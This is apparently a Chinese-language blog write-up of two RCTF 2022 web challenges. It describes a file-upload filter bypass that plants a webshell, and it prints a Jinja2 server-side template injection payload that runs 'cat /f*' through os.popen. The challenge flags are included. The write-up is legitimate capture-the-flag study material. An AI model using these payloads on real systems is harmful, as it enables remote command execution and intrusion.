---
title: RCTF
date: 2022-12-14 19:25:00
tags:
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/4bff6acf-60d8-4b0b-87de-49b3bf51fcc8.png?x-oss-process=hzy)

<!--more-->

# 前言

48h的比赛，题目质量很好，只看了web，写了两道题目，记录一下吧，其他题目也看大佬的wp了，先学习一下，就不复现了，期末考试没时间

# easy_upload

文件上传类型题目

文件名通过大小写绕过，文件内容先使用base64反复加密编码数据进行欺骗绕过过滤

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image002.png?x-oss-process=hzy)

成功webshell之后命令执行得到flag

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image004.png?x-oss-process=hzy)

RCTF{ar3_u_s1ng1e_d0g?}

# filechecker_mini

ssti

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image006.png?x-oss-process=hzy)

`*\#! /{{config.__class__.__init__.__globals__[&apos;os&apos;].popen(&apos;cat /f*&apos;).read()}}*`

得到flag

RCTF{Just_A_5mall_Tr1ck_mini1i1i1__Fl4g_Y0u_gOtt777!!!}